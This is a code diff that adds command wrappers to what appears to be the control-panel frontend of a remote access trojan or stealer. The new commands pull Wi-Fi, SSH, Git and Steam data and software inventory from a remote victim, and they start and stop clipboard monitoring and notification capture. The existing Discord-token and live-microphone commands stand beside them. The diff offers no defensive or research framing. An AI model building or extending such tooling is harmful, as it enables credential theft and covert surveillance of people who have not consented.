@@ -246,6 +246,60 @@ export const requestDiscordTokensCmd = async (
   return invoke("request_discord_tokens", { addr });
 };
 
+export const requestWifiDataCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("request_wifi_data", { addr });
+};
+
+export const requestSoftwareInventoryCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("request_software_inventory", { addr });
+};
+
+export const requestGitDataCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("request_git_data", { addr });
+};
+
+export const requestSSHDataCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("request_ssh_data", { addr });
+};
+
+export const requestSteamDataCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("request_steam_data", { addr });
+};
+
+export const startClipboardMonitorCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("start_clipboard_monitor", { addr });
+};
+
+export const stopClipboardMonitorCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_clipboard_monitor", { addr });
+};
+
+export const startNotificationCaptureCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("start_notification_capture", { addr });
+};
+
+export const stopNotificationCaptureCmd = async (
+  addr: string | undefined
+): Promise<void> => {
+  return invoke("stop_notification_capture", { addr });
+};
+
 export const startMicLiveCmd = async (
   addr: string | undefined,
   deviceId: string
